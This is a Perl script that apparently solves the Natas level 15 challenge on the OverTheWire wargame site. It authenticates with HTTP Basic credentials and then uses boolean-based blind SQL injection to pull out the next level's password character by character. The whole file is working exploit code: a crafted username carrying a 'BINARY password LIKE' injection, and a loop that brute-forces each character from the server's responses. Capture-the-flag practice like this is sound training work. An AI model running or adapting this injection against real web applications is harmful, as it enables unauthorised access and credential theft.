use strict;
use warnings;
use HTTP::Tiny;
use Path::Tiny;
use MIME::Base64 'encode_base64';

my $num = 14;
my $user = "natas" . ($num + 1);
my @lines = path('Pwds.txt')->lines_utf8;
my $pass = $lines[$num];

my $url = "http://$user.natas.labs.overthewire.org/";
my $http = HTTP::Tiny->new;
my %headers = (
    'Authorization' => 'Basic ' . encode_base64("$user:$pass", ''),
    'Content-Type' => 'application/x-www-form-urlencoded',
);

sub req {
    my ($username) = @_;

    my $response = $http->post($url, {
        headers => \%headers,
        content => "username=$username"
    });

    unless ($response->{success}) {
        die "Failed: $response->{status} $response->{content}\n";
    }

    return $response->{content};
}

my $chars = join('', 'A'..'Z', 'a'..'z', '0'..'9');
my $nextpass = '';

while (length $nextpass < 32) {
   for my $ch (split //, $chars) {
       my $candidate = "$nextpass$ch";
       print "Attempting password: $candidate\n";
       my $username = "natas16\"AND BINARY password LIKE \"$candidate%\"#";

       my $res = req $username;
       unless ($res =~ "doesn't exist") {
           $nextpass = $candidate;
           print "$nextpass\n";
           last;
       }
   }
}